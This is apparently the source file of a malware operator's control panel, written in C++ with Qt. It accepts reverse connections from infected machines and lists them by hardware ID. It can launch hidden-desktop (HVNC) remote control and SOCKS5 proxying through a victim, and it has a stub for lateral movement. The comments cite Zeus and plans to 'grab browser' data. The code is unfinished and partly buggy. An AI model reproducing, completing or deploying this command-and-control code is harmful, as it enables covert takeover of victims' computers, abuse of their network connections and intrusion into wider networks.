/*Wake up and do the following
 * Fucking implement the backconnect shitz according to the zeus stuffs
 * implement the vs side of the code
 * fix the read() shit
 * fix the hvnc crap
 * do the socks5 crap
 * start some basic lateral shit if i want
 * fuzz the ioctl code of the SO_KEEPALIVE
 * go grab browser and test shit
 */

#include "backconnect.h"
#include <QPushButton>
#include <QCheckBox>
#include <QLabel>
#include <QLineEdit>
#include <QPainter>
#include <QListWidget>
#include <QPixmap>
#include "hvnc_main_view.h"
#include "main_controller.h"
#include "socks5_control.h"
#include <QMap>
#include <iterator>
#include <QTableWidget>
#include <QHeaderView>
#include <QMouseEvent>
#include <QMenu>
#include <QTime>
QMap <QString, Connection*> backconnect::ConnectionMap;
int backconnect::listen_port;
void backconnect::onReadyRead()
{
    QTcpSocket * senderSocket = dynamic_cast<QTcpSocket*>(sender());

    if(!senderSocket)
        return;

    QString peerName = senderSocket->peerName();
    //if(!peerName)
    int socket_type = NOTHING;
    senderSocket->read((char*)&socket_type, sizeof(socket_type));
    auto search = ConnectionMap.find(peerName);
    if(search == ConnectionMap.end()){
        // allocate and insert?? there should already be an entry though no ?
        Connection * connection = new Connection;
        ConnectionMap.insert(peerName, connection);
    }

    switch(socket_type){
        case REVERSE_CONNECTION:
    {
        // traditional connection.
        QTcpSocket *tcpSock = search.value()->MainSock;
        search.value()->MainSock = senderSocket;

        int row = table->rowCount();
        table->setRowCount(row + 1);
        QByteArray lpszPacket;
        while(tcpSock->bytesAvailable()){
            lpszPacket.append(tcpSock->readAll());
        }
// we use this as seperator?!

        // HWID|TIME
        QList<QByteArray> lpszParts = lpszPacket.split('|');

        table->setItem(row, 0, new QTableWidgetItem(tr(lpszParts.at(0))));
        table->setItem(row, 1, new QTableWidgetItem(search.value()->MainSock->peerName()));
        table->setItem(row, 2, new QTableWidgetItem(search.value()->MainSock->peerPort()));
        table->setItem(row, 3, new QTableWidgetItem("false")); // no encryption as of yet
        table->setItem(row, 4, new QTableWidgetItem(tr(lpszParts.at(1))));
        table->setItem(row, 5, new QTableWidgetItem(tr(lpszParts.at(1))));
        // insert shit
    }
        break;
        case SOCKS5:
    {

        search.value()->SocksSocket = senderSocket;
        disconnect(senderSocket ,SIGNAL(readyRead()),this,SLOT(on_readyRead()));
        socks5_control *socks_ui = new socks5_control(this, search.value()->SocksSocket);
        socks_ui->show();

    }
        break;
        case HVNC:
    {
        int HVNC_SockType = NOTHING;

        senderSocket->read((char*)&HVNC_SockType, sizeof(HVNC_SockType));
        if((HVNC_SockType != USER_INPUT) && (HVNC_SockType != DESKTOP)){
            // wtf is being sent?
            senderSocket->close();
            return;
        }

        search.value()->HVNC_Sockets[HVNC_SockType] = senderSocket;
        if(
                (search.value()->HVNC_Sockets[USER_INPUT] != nullptr) &&
                (search.value()->HVNC_Sockets[DESKTOP] != nullptr)
        )
        {
            //
            disconnect(senderSocket ,SIGNAL(readyRead()),this,SLOT(on_readyRead()));
            search.value()->HVNC_Config = true;
            hvnc_main_view *hvnc = new hvnc_main_view(this, search.value()->HVNC_Sockets);
            hvnc->show();
        }
    }
        break;
    case LATERAL:
    {
        // todo
    }
        break;

    default:
    {
// report this error in the error page.
    }
        break;
    }
}
void backconnect::newConnection(){
  QTcpSocket *socket = tcpServer->nextPendingConnection();
  if(socket)
  {
        connect(socket ,SIGNAL(readyRead()),this,SLOT(onReadyRead()));
        //connect(socket ,SIGNAL(disconnected()),socket ,SLOT(deleteLater()));
        Connection * connection = new Connection;
        ConnectionMap.insert(socket->peerName(), connection);
   }
}
void backconnect::disconnect_sock(QString peerName){

    auto search = ConnectionMap.find(peerName);
    if(search == ConnectionMap.end()){
        // the fuck there is no entry?!
        return;
    }
    search.value()->MainSock->close();
    // write to log that this client has disconnected.
    // also remove any additional data that needs to be cleanup here...
}
void backconnect::disconnect_action(){
    QAction *action = qobject_cast<QAction *>(sender());
    QVariant variant_name = action->data();
    QString peerName = variant_name.value<QString>();
    disconnect_sock(peerName);
}
void backconnect::socks_action(){
    QAction *action = qobject_cast<QAction *>(sender());
    QVariant variant_name = action->data();
    QString peerName = variant_name.value<QString>();

    auto search = ConnectionMap.find(peerName);
    if(search == ConnectionMap.end()){
        // the fuck there is no entry?!
        return;
    }
    int data = SOCKS5;

    search.value()->MainSock->write((const char*)&data, sizeof(data));
    // write to logs that we want have sent a request

    return;
}
void backconnect::hvnc_action(){
    QAction *action = qobject_cast<QAction *>(sender());
    QVariant variant_name = action->data();
    QString peerName = variant_name.value<QString>();

    auto search = ConnectionMap.find(peerName);
    if(search == ConnectionMap.end()){
        // the fuck there is no entry?!
        return;
    }
    int data = HVNC;

    search.value()->MainSock->write((const char*)&data, sizeof(data));
    // write to logs that we want have sent a request

    return;
}
backconnect::backconnect(QWidget *parent) : QWidget(parent)
{
    tcpServer = new QTcpServer();
    tcpServer->listen(QHostAddress::Any, listen_port);
    connect(tcpServer, &QTcpServer::newConnection, this, &backconnect::newConnection);
    table = new QTableWidget;
    table->setSelectionBehavior(QAbstractItemView::SelectRows);
    table->setSelectionMode(QAbstractItemView::SingleSelection);
    table->setFixedHeight(350);
    table->setFixedWidth(950);
    QStringList headers;
    headers << "HWID" << "PeerName" << "PORT" << "Proxy" << "Time Last Seen";
    table->setColumnCount(5); table->setHorizontalHeaderLabels(headers);
    for(int i = 0 ; i < 5; i++) table->horizontalHeader()->setSectionResizeMode(i, QHeaderView::Stretch);
    table->setShowGrid(false);
    table->setWordWrap(true);
    table->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOn);
    table->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOn);


    QVBoxLayout *vl2 = new QVBoxLayout;
    QHBoxLayout *hl1 = new QHBoxLayout;
    vl2->addLayout(hl1);
    vl2->addSpacing(10); vl2->addWidget(table);
    vl2->addStretch();
    //QWidget *qWidget = new QWidget;
    this->setLayout(vl2);

    //this->setCentralWidget(qWidget);
    start_hvnc = new QAction(tr("Start HVNC"), this);
    connect(start_hvnc, &QAction::triggered, this, &backconnect::hvnc_action);
    start_socks = new QAction(tr("Start Socks5"), this);
    connect(start_socks, &QAction::triggered, this, &backconnect::socks_action);
    disconnect_client = new QAction(tr("Disconnect Client"), this);
    connect(disconnect_client, &QAction::triggered, this, &backconnect::disconnect_action);
    start_lateral = new QAction(tr("Lateral Movement Panel"), this);
    connect(start_lateral, &QAction::triggered, this, &backconnect::startLateralMovementPanel);
    this->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(this, SIGNAL(customContextMenuRequested(const QPoint &)), this, SLOT(showContextMenu(const QPoint &)));

}
void backconnect::startLateralMovementPanel(){
    QAction *action = qobject_cast<QAction *>(sender());
    QVariant variant_name = action->data();
    QString peerName = variant_name.value<QString>();

    auto search = ConnectionMap.find(peerName);
    if(search == ConnectionMap.end()){
        // the fuck there is no entry?!
        return;
    }


}
void backconnect::showContextMenu(const QPoint &pos){
    int rows = table->rowCount();
    int CurrentRow = table->currentRow();
    if((rows > 0) && (CurrentRow <= rows)){
        QMenu *menu = new QMenu;
        QString peer_name = table->item(CurrentRow, 1)->text();
        menu->addAction(start_hvnc);
        start_hvnc->setData(peer_name);
        menu->addAction(start_socks);
        start_socks->setData(peer_name);
        menu->addAction(disconnect_client);
        disconnect_client->setData(peer_name);
        menu->addAction(start_lateral);
        start_lateral->setData(peer_name);
        menu->exec(mapToGlobal(pos));
    }

}

backconnect::~backconnect()
{
    QMap<QString, Connection*>::Iterator it;
// cleanup the data and close windows.

    for(it = ConnectionMap.begin(); it != ConnectionMap.end(); it++){
        // close socket etc etc here
        delete it.value();

    }
}

